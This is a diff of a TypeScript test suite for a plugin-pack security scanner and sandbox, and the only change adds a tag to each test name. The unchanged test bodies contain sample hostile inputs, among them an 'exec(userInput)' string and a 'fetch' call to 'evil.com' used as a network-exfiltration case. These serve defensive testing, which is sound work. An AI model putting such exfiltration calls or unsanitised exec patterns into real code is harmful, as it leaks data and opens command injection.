@@ -8,7 +8,7 @@ function sha256(value: string): string {
   return createHash("sha256").update(value, "utf8").digest("hex");
 }
 
-test("PackSecurityService fails closed when manifest checksum is malformed", async () => {
+test("PackSecurityService fails closed when manifest checksum is malformed [pack-security-service]", async () => {
   const service = new PackSecurityService();
 
   const result = await service.runSecurityScan({
@@ -24,7 +24,7 @@ test("PackSecurityService fails closed when manifest checksum is malformed", asy
   assert.equal(result.issues[0]?.code, "PKG001");
 });
 
-test("PackSecurityService validates inline source checksum integrity", async () => {
+test("PackSecurityService validates inline source checksum integrity [pack-security-service]", async () => {
   const service = new PackSecurityService();
   const inlineSource = "export default { action: 'summarize' };";
 
@@ -41,7 +41,7 @@ test("PackSecurityService validates inline source checksum integrity", async () 
   assert.equal(result.issues.some((issue) => issue.code === "PKG002"), true);
 });
 
-test("PackSecurityService warns on high-risk permissions and overlapping dependency versions", async () => {
+test("PackSecurityService warns on high-risk permissions and overlapping dependency versions [pack-security-service]", async () => {
   const service = new PackSecurityService();
   const inlineSource = "export const capability = 'catalog';";
 
@@ -77,7 +77,7 @@ test("PackSecurityService warns on high-risk permissions and overlapping depende
   assert.equal(resolution.suggestions.length > 0, true);
 });
 
-test("PackSecurityService fails on combined exec capability and bash permission", async () => {
+test("PackSecurityService fails on combined exec capability and bash permission [pack-security-service]", async () => {
   const service = new PackSecurityService();
   const inlineSource = "exec(userInput)";
 
@@ -95,7 +95,7 @@ test("PackSecurityService fails on combined exec capability and bash permission"
   assert.equal(result.issues.some((issue) => issue.code === "SAND001"), true);
 });
 
-test("PackSecurityService sandbox detects attempts to access restricted globals", async () => {
+test("PackSecurityService sandbox detects attempts to access restricted globals [pack-security-service]", async () => {
   const service = new PackSecurityService();
   // Malicious code that tries to access process, Buffer, fetch, etc.
   const maliciousCode = `
@@ -129,7 +129,7 @@ test("PackSecurityService sandbox detects attempts to access restricted globals"
   assert.equal(result.status, "passed");
 });
 
-test("PackSecurityService sandbox detects code with infinite loop via timeout", async () => {
+test("PackSecurityService sandbox detects code with infinite loop via timeout [pack-security-service]", async () => {
   const service = new PackSecurityService();
   // Code that would run for a very long time
   const infiniteLoopCode = `
@@ -154,7 +154,7 @@ test("PackSecurityService sandbox detects code with infinite loop via timeout", 
   assert.equal(result.issues.some((issue) => issue.code === "SAND011"), true);
 });
 
-test("PackSecurityService sandbox executes normal code successfully", async () => {
+test("PackSecurityService sandbox executes normal code successfully [pack-security-service]", async () => {
   const service = new PackSecurityService();
   // Normal, safe code
   const normalCode = `
@@ -178,7 +178,7 @@ test("PackSecurityService sandbox executes normal code successfully", async () =
   assert.equal(result.issues.length, 0);
 });
 
-test("PackSecurityService sandbox detects network exfiltration attempts", async () => {
+test("PackSecurityService sandbox detects network exfiltration attempts [pack-security-service]", async () => {
   const service = new PackSecurityService();
   // Code that attempts to use blocked fetch - handled by sandbox
   const networkCode = `fetch('https://evil.com/data');`;
